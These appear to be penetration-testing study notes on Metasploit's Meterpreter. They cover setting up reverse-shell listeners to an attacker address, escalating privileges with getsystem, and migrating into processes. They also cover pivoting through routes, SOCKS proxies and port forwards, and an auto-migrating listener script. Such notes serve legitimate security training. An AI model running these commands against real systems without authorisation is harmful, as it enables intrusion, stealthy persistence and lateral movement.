---
tags:
---
# meterpreter

Metasploit C2

## Capabilities

### Setup listener

```bash
sudo msfconsole
# Inside metasploit
use exploit/multi/handler
set lhost tun0
set lport 9001
set payload linux/x64/meterpreter/reverse_tcp
# Windows: windows/x64/meterpreter/reverse_tcp
run -j
```

Note: The `-j` option runs the listener as a job to allow further execution

### Upgrade session from shell to meterpreter

```bash
sessions
# Sessions listed by ID
sessions -u 1
```

### Commands

```bash
# Drop into shell
shell

# Enumeration
sysinfo
getuid
netstat -ano
ps

# Check channels
channel -l
channel -i 1

# Prefix a command with "l" to run it on the local system
lpwd
/home/kali

# Get full path
search -f <file>

# Check time since last user interaction
idletime

# Attempt privilege escalation
getsystem

# Migrate to another processes (PID 8052 in this example)
migrate 8052

# Create a process to migrate to
execute -H -f notepad
migrate 2720
```

Channels are essentially sessions within an individual connection

### Routing

```bash
# Add route manually (from msfconsole after backgrounding session)
route add 172.16.5.0/24 12
route print

# Add route automatically
use multi/manage/autoroute
show options
sessions -l
set session 12
run

# Open a SOCKS proxy to enable applications outside of metasploit to use routes
use auxiliary/server/socks_proxy
show options
set SRVHOST 127.0.0.1
set VERSION 5
run -j

# Port forward (alternative to SOCKS proxy for an individual port)
portfwd add -l 3389 -p 3389 -r 172.16.5.200
```

We then just need to add `socks5 127.0.0.1 1080` to the bottom of our `/etc/proxychains4.conf` file

### Automation

We can start by configuring a normal meterpreter listener

```bash
use exploit/multi/handler
set payload windows/meterpreter_reverse_https
set lhost 192.168.119.4
set lport 443
```

We can then set `AutoRunScript` to automatically launch a background `notepad.exe` process and migrate to it

```bash
set AutoRunScript post/windows/manage/migrate
```

We can also set `ExitOnSession` to false so that we keep accepting new connections after a session is created

```bash
set ExitOnSession false
```

We can finally execute `run` with the arguments `-z`, and `-j` to run it as a job in the background and to stop us from interacting with the session

```bash
run -z -j
```

We can combine all of these commands in the the following script file named `listener.rc`

```bash
use exploit/multi/handler
set payload windows/meterpreter_reverse_https
set lhost 192.168.119.4
set lport 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
```

And we can then execute these commands in sequence with the `-r` option in metasploit

```bash
sudo msfconsole -r listener.rc
```

We can find default scripts via the following command

```bash
ls -l /usr/share/metasploit-framework/scripts/resource
```
